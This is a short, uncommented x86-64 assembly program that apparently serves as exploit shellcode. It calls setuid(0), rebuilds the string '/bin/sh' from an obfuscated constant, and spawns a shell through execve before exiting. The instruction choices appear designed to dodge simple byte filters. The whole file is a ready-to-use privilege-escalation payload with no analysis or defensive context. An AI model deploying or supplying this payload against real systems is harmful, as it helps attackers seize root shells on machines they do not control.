section .text
global _start

_start:
sub rdi,rdi
mov al , 0x69
syscall
push 0
pop rdx
mov  rbx , 0x68732f6e69622fff
shr  rbx , 0x8
push  rbx
push rsp
pop rdi
or rax, -1
inc rax
push rax
push rdi
xor rsi, rsi
add rsi, rsp
mov  al , 0x3b
syscall
push 0x1
pop  rdi
push 0x3c
pop  rax
syscall
